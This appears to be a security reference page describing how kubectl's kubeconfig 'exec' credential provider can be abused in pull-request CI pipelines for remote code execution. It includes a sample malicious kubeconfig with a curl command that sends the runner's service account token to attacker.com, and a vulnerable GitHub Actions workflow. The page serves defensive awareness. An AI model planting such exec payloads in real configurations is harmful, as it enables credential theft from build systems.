---
layout: tool
title: kubectl
parent: Living Off The Pipeline
nav_order: 22
---

## Living Off The Pipeline - kubectl

`kubectl` is the command-line tool for controlling Kubernetes clusters. It can be abused as a "Living Off The Pipeline" (LOTP) tool by processing a malicious `kubeconfig` file, leading to Remote Code Execution (RCE). This vector is particularly dangerous because it leverages a standard, documented, but non-obvious feature of `kubectl`'s authentication mechanism.

### First-Order LOTP Tool

`kubectl` is a **First-Order LOTP Tool**. It provides direct RCE by design, as its configuration file format supports executing arbitrary commands for authentication.

#### Malicious Primitive: Remote Code Execution (RCE)

The `kubeconfig` file, which `kubectl` uses to configure access to clusters, supports an `exec` authentication provider. This feature is intended to allow `kubectl` to call a helper utility (like a cloud provider's CLI) to retrieve temporary credentials. However, an attacker can abuse this to specify an arbitrary shell command.

An attacker can place a malicious `kubeconfig` file in their pull request. If a CI/CD pipeline is configured to use this file (typically by setting the `KUBECONFIG` environment variable), any `kubectl` command that attempts to communicate with the cluster will trigger the attacker's payload.

### Real-World Attack Scenario: Abusing PR Preview Deployments

A common CI/CD pattern is to deploy a preview environment to Kubernetes for every pull request. This workflow is a prime target for the `kubectl` LOTP vector.

1.  **Attacker's PR:** An attacker submits a pull request where they have replaced a legitimate, repository-local `kubeconfig.yml` with a malicious version.
    ```yaml
    # malicious-kubeconfig.yml
    apiVersion: v1
    kind: Config
    clusters:
    - name: preview-cluster
      cluster: { server: "https://kubernetes.default.svc" }
    contexts:
    - name: preview-context
      context: { cluster: preview-cluster, user: ci-user }
    current-context: preview-context
    users:
    - name: ci-user
      user:
        # The 'exec' block is the weapon.
        exec:
          apiVersion: client.authentication.k8s.io/v1beta1
          command: sh
          args:
            - "-c"
            # The payload exfiltrates the runner's service account token.
            - "curl -d @/var/run/secrets/kubernetes.io/serviceaccount/token http://attacker.com/"
    ```

2.  **Vulnerable Workflow:** The pipeline uses a standard workflow to deploy the preview. The developer has pointed `KUBECONFIG` to the file in the repository, believing this is a secure and isolated practice.
    ```yaml
    # .github/workflows/preview-deploy.yml
    name: Deploy PR Preview
    on: [pull_request]
    jobs:
      deploy:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - name: Deploy to preview namespace
            env:
              KUBECONFIG: ./malicious-kubeconfig.yml
            run: |
              kubectl apply -f ./k8s-manifests/
    ```

3.  **Execution:**
    *   The `kubectl apply` command runs.
    *   It reads the attacker's `kubeconfig.yml` specified by the `KUBECONFIG` variable.
    *   To authenticate, it finds the `user.exec` block and executes the attacker's shell command.
    *   The `curl` command runs, stealing the high-privilege service account token from the runner before the `apply` command can even proceed.

This attack is dangerous because the developer's intent (using a repo-local config for security) is subverted. The vulnerability is created by trusting a configuration file from an untrusted pull request.

### References

*   [Kubernetes Docs: Exec credential provider](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#exec-credential-provider)